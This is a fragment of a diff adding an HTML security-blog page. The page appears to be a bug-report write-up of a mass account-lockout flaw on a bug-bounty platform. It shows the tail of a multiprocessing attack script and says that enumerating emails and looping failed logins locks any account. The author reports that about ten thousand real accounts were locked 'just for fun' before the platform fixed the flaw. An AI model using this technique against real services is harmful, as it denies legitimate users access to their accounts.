+	<span class="n">pool</span><span class="o">.</span><span class="nb">map</span><span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">tasks</span><span class="p">)</span></code></pre></figure>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa7.png" alt="" /></p>
+
+<p>After 100+ login attempts with incorrect passwords, the account was locked out successfully.</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa6.png" alt="" /></p>
+
+<p>If I want to lock someone’s account, I just need to enumerate the email addresses and then loop the script. Because the session will be invalidated after being locked, and the <code class="highlighter-rouge">unlock token</code> is unique each time it is locked.</p>
+
+<h2 id="0x04-end">0x04 End.</h2>
+
+<p>后来的故事就是封了万个号，h1官方进行了修正，并向被锁账号们群发了该事件的邮件：</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa10.png" alt="" /></p>
+
+<p>Just For Fun :]</p>
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
